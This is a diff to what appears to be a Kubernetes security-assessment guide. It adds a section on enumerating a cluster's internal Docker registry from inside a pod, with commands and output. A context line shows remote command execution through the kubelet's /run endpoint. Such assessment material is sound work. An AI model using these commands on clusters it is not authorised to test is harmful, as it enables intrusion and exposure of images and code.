@@ -128,6 +128,24 @@ Performing commands remotely through Kubernetes API Server:
 # curl -k -XPOST "https://192.168.99.100:10250/run/hello/hello-v3-7cb4968687-w7rkt/helloworld" -d "cmd=cat app.py"
 ```
 
+## 2.4) Getting information about Docker Images stored in Docker Registry
+
+```sh
+$ kubectl get pod,svc -n kube-system | grep registry
+po/registry-7lmvk              1/1       Running   0          22m
+svc/registry               ClusterIP   10.96.231.4     <none>        80/TCP          22m
+
+$ kubectl exec -it busybox-curl-745f8579cd-jw9q9 -- sh
+root@busybox-curl-745f8579cd-jw9q9:/ ]$ curl -v registry.kube-system.svc.cluster.local/v2/_catalog
+root@busybox-curl-745f8579cd-jw9q9:/ ]$ nslookup registry.kube-system.svc.cluster.local
+Server:    10.96.0.10
+Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.local
+
+Name:      registry.kube-system.svc
+Address 1: 10.96.231.4 registry.kube-system.svc.cluster.local
+```
+
+
 ## 3) Assessing the Kubernetes API Server security
 
 ```sh
